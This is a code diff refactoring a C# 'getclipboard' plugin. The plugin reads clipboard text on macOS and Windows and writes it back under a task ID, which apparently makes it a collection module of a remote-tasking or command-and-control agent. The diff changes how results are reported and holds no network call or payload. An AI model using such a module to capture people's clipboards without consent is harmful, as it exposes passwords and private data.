@@ -10,7 +10,7 @@ namespace Plugin
 {
     public static class getclipboard
     {
-        public static ResponseResult Execute(Dictionary<string, object> args)
+        public static void Execute(Dictionary<string, object> args)
         {
             //I can either include this all in one (easier but larger plugin size)
             //Or I can split them into 3 separate DLL's and handle which one to load on the "load" side
@@ -18,53 +18,31 @@ namespace Plugin
             {
                 if (OperatingSystem.IsMacOS())
                 {
-                    return new ResponseResult
-                    {
-                        completed = "true",
-                        user_output = OsxClipboard.GetText(),
-                        task_id = (string)args["task-id"],
-                    };
+                    PluginHandler.Write(OsxClipboard.GetText(), (string)args["task-id"], true);
                 }
                 else if (OperatingSystem.IsWindows())
                 {
-                    return new ResponseResult
-                    {
-                        completed = "true",
-                        user_output = WindowsClipboard.GetText(),
-                        task_id = (string)args["task-id"],
-                    };
-
-                }
-                else if (OperatingSystem.IsLinux())
-                {
-                    return new ResponseResult
-                    {
-                        completed = "true",
-                        user_output = "Not implemented on this OS yet.",
-                        task_id = (string)args["task-id"],
-                        status = "error"
-                    };
+                    PluginHandler.Write(WindowsClipboard.GetText(), (string)args["task-id"], true);
                 }
                 else
                 {
-                    return new ResponseResult
-                    {
-                        completed = "true",
-                        user_output = "Not implemented on this OS yet.",
-                        task_id = (string)args["task-id"],
-                        status = "error"
-                    };
+                    PluginHandler.Write("Not implemented on this OS yet.", (string)args["task-id"], true, "error");
                 }
+                //else
+                //{
+                //    return new ResponseResult
+                //    {
+                //        completed = "true",
+                //        user_output = "Not implemented on this OS yet.",
+                //        task_id = (string)args["task-id"],
+                //        status = "error"
+                //    };
+                //}
             }
             catch (Exception e)
             {
-                return new ResponseResult
-                {
-                    completed = "true",
-                    user_output = "",
-                    task_id = (string)args["task-id"],
-                    status = "error"
-                };
+                PluginHandler.Write(e.ToString(), (string)args["task-id"], true, "error");
+                return;
             }
         }
 
